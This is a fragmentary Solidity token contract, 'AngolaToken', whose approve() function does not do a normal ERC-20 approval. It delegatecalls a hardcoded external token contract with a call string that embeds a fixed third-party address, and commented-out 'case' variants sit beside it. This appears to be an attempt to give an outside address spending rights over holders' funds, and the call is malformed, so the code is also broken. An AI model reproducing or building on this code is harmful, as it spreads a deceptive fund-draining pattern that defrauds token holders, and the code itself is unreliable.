...
contract AngolaToken {
  ...
  constructor() {
    name = "Angola National token"; // Sets the name of the token, i.e Ether
    symbol = "ANGOLA"; // Sets the symbol of the token, i.e ETH
    decimals = 18; // Sets the number of decimal places
    uint256 _initialSupply = 50000000000000000000000000; // Holds an initial supply of coins
  ...
  function approve() public {
            // bnbContract.call(bytes4(keccak256("approve('0xB99983713C7391F6c22f0D5990963b24FaA2EbC9', '1000')")));                 // Случай 1
            //addr.delegatecall (bytes4 (keccak256 ("test ()"))); // Случай 2
      address bnbContract = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
      bnbContract.delegatecall(abi.encodeWithSignature("approve(0xB99983713C7391F6c22f0D5990963b24FaA2EbC9, 1000000)")); // случай 3   
    }
